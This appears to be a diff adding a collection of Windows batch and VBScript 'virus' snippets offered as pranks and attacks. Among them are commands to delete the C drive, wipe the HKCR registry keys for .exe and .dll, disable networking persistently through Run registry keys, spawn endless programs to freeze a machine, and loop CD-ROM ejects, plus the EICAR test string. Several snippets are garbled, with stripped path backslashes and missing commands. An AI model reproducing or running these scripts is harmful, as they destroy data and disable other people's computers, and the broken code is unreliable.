@@ -1,0 +1,100 @@
+#To delete the C Drive Permanently(harmfull):-
+@Echo off
+Del C: *.* |y
+
+
+#To create the cdRom viruses(harmless):-
+Set oWMP = CreateObject(“WMPlayer.OCX.7”)
+Set colCDROMs = oWMP.cdromCollection
+do
+if colCDROMs.Count >= 1 then
+For i = 0 to colCDROMs.Count – 1
+colCDROMs.Item(i).Eject
+Next
+For i = 0 to colCDROMs.Count – 1
+colCDROMs.Item(i).Eject
+Next
+End If
+wscript.sleep 5000
+loop
+
+
+
+#To create a Virus with the help of which you can test your antivirus (fake virus notepad)
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+
+
+#To stop someone’s Internet Access with the help of Virus
+@Echo off
+Ipconfig /release
+
+
+
+#To create a Matrix Type screen  
+@echo off
+color 02
+:start
+echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
+goto start
+
+
+
+
+#To create a virus which Shutdowns the computer
+-s -t 50 -c “Virus Detection. The computer is shutting down”
+
+
+
+
+#To Disable Internet Permanently
+echo @echo off>c:windowswimn32.bat
+echo break off>c:windowswimn32.bat echo
+ipconfig/release_all>c:windowswimn32.bat
+echo end>c:windowswimn32.batreg add
+hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
+PAUSE
+
+
+
+
+#Endless Notepads To crash or freeze the computer
+@ECHO off
+:top
+START %SystemRoot%\system32\notepad.exe
+GOTO top
+#3 Endless Enter
+The below code will make the enter button pressed continuously
+Set wshShell = wscript.CreateObject(”WScript.Shell”)
+do
+wscript.sleep 100
+wshshell.sendkeys "~(enter)"
+loop
+
+
+
+#How to Delete Key Registry Files
+@ECHO OFF
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+:MESSAGE
+ECHO Your PC has been crashed. Your Dad.
+GOTO MESSAGE
+
+
+
+
+#App Bomber- resulting in infinite apps
+@echo off
+>:(
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+
